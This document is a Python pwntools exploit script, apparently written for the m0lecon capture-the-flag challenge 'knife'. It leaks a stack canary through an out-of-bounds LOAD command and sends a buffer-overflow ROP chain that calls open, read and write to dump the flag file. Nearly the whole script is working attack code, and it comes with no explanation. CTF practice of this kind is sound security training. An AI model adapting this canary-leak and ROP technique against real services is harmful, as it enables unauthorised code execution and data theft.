from pwn import *
context.log_level = "debug"
# p = process
# p = remote("0.0.0.0",9010)
p = remote("challs.m0lecon.it",9010)
elf = ELF("knife")

def load(offset):
	p.sendline("LOAD " + str(offset))
	return p.recv()


canary = u64(load(-13))
print hex(canary)

pop_rdi = 0x00000000004014f3
pop_rsi_r15 = 0x00000000004014f1
ret = 0x000000000040028e
flag = 0x401518
mov_rdx = 0x0000000000401528

load = u64(load(-14))
print hex(load)

base = 0x7ffefa79d660 + 0x90

# payload = "EXIT"*10 + p64(canary) + "AAAABBBB" + p64(pop_rdi) + p64(flag) + p64(pop_rsi_r15) + p64(0)*2 + p64(elf.plt['open']) + p64(pop_rdi) + p64(5) + p64(pop_rsi_r15) + p64(0x0000000000602200)*2 + p64(elf.plt['read']) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(0x0000000000602200)*2 + p64(elf.got['write'])
# payload = "A"*200
libc_base = 0x7f1c6f581000
libc_local = 0x7ff84f2a3000
payload = "EXIT"*10
payload += p64(canary)
payload += "A"*8
payload += p64(pop_rdi)
payload += p64(flag)
payload += p64(pop_rsi_r15)
payload += p64(0)*2
payload += p64(elf.plt['open'])
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi_r15)
payload += p64(0x602100)*2
payload += p64(mov_rdx)
payload += p64(elf.plt['read'])
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(0x602100)*2
payload += p64(mov_rdx)
payload += p64(0x400E7B)

p.sendline(payload)
# leaks = p.recv()

# atoi = u64(leaks[0:8])
# print hex(atoi)


# canary = u64(load(-15))
# print hex(canary)




p.interactive()